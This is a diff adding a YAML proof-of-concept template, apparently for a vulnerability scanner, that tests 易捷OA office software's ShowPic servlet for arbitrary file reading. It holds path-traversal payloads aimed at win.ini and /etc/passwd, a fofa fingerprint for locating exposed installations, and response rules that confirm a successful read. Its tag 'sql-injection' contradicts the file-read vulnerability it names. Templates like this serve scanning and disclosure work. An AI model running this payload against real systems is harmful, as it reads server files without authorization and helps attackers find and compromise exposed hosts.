@@ -1,0 +1,21 @@
+id: poc-yaml-jieoa-showpic-read-any-file
+info:
+  name: 易捷OA协同办公软件ShowPic存在任意文件读取漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 易捷OA
+  fofa: body="/images/logon/bg_img.jpg"
+variables:
+  filereadPayload: '../../windows/win.ini
+
+    ../../../../../etc/passwd
+
+    '
+requests:
+- method: GET
+  path: /servlet/ShowPic?filePath={{.filereadPayload}}
+  expression: "(\nstatus_code == 200 &&\ncontains(body, \"bit app support\") && \n\
+    contains(body,\"fonts\") &&\ncontains(body,\"extensions\")\n) || (\nstatus_code\
+    \ == 200 && \nmatches(body, \"root:[x*]:0:0:\")\n)\n"
+transport: http
